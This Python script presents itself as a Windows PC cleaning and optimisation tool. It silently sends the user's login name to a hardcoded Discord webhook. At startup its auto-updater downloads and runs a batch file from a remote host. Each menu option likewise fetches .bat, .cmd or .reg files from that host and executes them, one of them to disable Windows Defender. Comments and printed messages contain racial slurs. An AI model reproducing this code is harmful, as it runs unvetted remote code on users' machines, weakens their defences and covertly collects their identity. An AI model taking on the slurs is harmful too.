import threading
from tkinter import font
import tkinter as tk
from tkinter import ttk, messagebox
import webbrowser
from random import randint
import base64
import os
import time
import subprocess
from colorama import Fore
from pathlib import Path
import platform
import sys
import shutil
import pathlib
from discord import Webhook, RequestsWebhookAdapter
import socket 
import psutil
import webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pystyle
except:
    os.system("pip install pystyle")
    import pystyle

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    from colorama import Fore
except:
    os.system("pip install Fore")
    from colorama import Fore

try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
except:
    os.system("pip install pystyle")
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
 
#auto update
THIS_VERSION ='1.4'
def updater():
    v = requests.get("https://pastebin.com/raw/w29LjVc2").text
    time.sleep(0.5)
    if not THIS_VERSION == v:
        os.system("cls")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        with open(fr"updater.bat", 'wb') as f:
         f.write(r.content)
        os.startfile("updater.bat")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
        input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
        os._exit(1)
    else:
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
        time.sleep(0.5)
updater()
BY = 'by jotaro'
LMAO = 'version 1.4'
obj_Disk = psutil.disk_usage('/')
psutil.virtual_memory()
username = os.getlogin()
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)  
tools = os.getcwd()+"\\tools\\"
if not os.path.exists(tools):
    os.mkdir(tools)
#i just wanna know how many people ran my shit dont spam nigga thats gay tho

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', username="pycleaner bot", )
embed = DiscordEmbed(title='pycleaner ', description= username +' used ur program damn ', color='03b2f8')
embed.set_author(name='https://github.com/nightmare324/pycleaner', url='https://i.imgur.com/coJFefW.png', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
embed.set_footer(text='https://github.com/nightmare324/pycleaner', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content='<@822132948769177620>')
webhook.add_embed(embed)
response = webhook.execute()
# THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
ver = Center.XCenter('''
by jotaro 
██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ░░███╗░░░░░░░██╗██╗██╗
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ░████║░░░░░░██╔╝██║██║
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ██╔██║░░░░░██╔╝░██║██║
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░███████║╚═╝
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚════██║██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░░░░░╚═╝╚═╝''')
__author__ = 'jotaro' 
__VERSION__ = '1.4'
os.system("title PRESS ENTER")

banner = LMAO+r'''
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
'''+ BY

System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
os.system("title  Hello, "+   username)

banner = Center.XCenter(LMAO+"""
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
"""+ BY)



options = """
         OPTIONS                         OPTIONS                             OPTIONS

1.)  create a restore point          2.)  temp cleaner                     3.)  log cleaner
4.)  disable services                5.)  Services Optimization            6.)  battery check (laptops only)
7.)  turn on hibernate               8.)  tree (better Responsiveness)     9.)  Delete Windows Update Cache
10.) disable windows defender        11.) sfc scan                         12.) Debloater (use it if u know how to)
13.) open restore point              14.) removes tools folder with files  15.) more info                     
16.) exit

"""
def download(url, name):
    response =  requests.get(url)
    open(tools+name, "w").write(response.text)
    os.startfile(tools+name)
    
    # THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.

def main():
    os.system('cls')
    print(Colorate.Vertical(Colors.blue_to_red, banner + options, 2))
    choice = input(Colors.yellow + 'Which option do you choose? ->  ')
    
    #restore point
    if choice == '1':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
    #temp
    if choice == '2':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
        
    #log cleaner
    elif choice == '3':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
       
    #disable services
    elif choice == "4":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
  
    #service_optimizer
    elif choice == "5":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")

    #battery_check
    elif choice == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
 
    #hibernate
    elif choice == '7':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")

    #tree
    elif choice == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")

    #windows update
    elif choice == '9':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")

    #disable_services
    elif choice == '10':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
    #sfc scan
    elif choice == '11':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
       
    #debloater   
    elif choice == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
     
    elif choice == '13':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
 

    #tools
    elif choice == '14':
       shutil.rmtree("tools")         
       main()
       
    #more info
    elif choice == '15':
        os.system('cls')
        print(Colors.red,ver)
        print(Colors.white,''' whats new:
        added auto update
        more cleaner
        fixed some stuff
        webhook when ever u run the file (only for me)
        more stuff in more info option 
        ''')
        
        print(Colors.orange,'')
        version = sys.getwindowsversion()
        print(platform.platform())
        print(version)
        print(platform.system())
        print(platform.release())
        print(platform.version())
        print(platform.version().split('.')[2]) 
        print((platform.machine())+ ' bit' )
        print("ur ip: "+IPAddr+' nice ip ngl')
        print('ur username is ' +   username)
        print ('total gb: ',obj_Disk.total / (1024.0 ** 3))
        print ('used gb:',obj_Disk.used / (1024.0 ** 3))
        print ('free gb:',obj_Disk.free / (1024.0 ** 3))
        print ('%: ',obj_Disk.percent)
        print('RAM memory % used:', psutil.virtual_memory()[2])
        print(Colors.white,'click enter to go back')
        print(Colors.white,'type more for more info')
        choice = input(Colors.yellow + 'Which option do you choose? ->  ')
        if choice == 'more':
         webbrowser.open("https://untimelyimpressionableadministration.blus2tlia.repl.co/new.txt")
        main()
    #exit
    elif choice == '16': 
        os._exit(0) 

    #else       
    else:
        print("what?\n") 
        print("try agian nigga")
        time.sleep(2)
        main()
    main()

if __author__ != 'jotaro':
    print("ERROR, dont play with the code nigga")
    os._exit(10)
         
main()
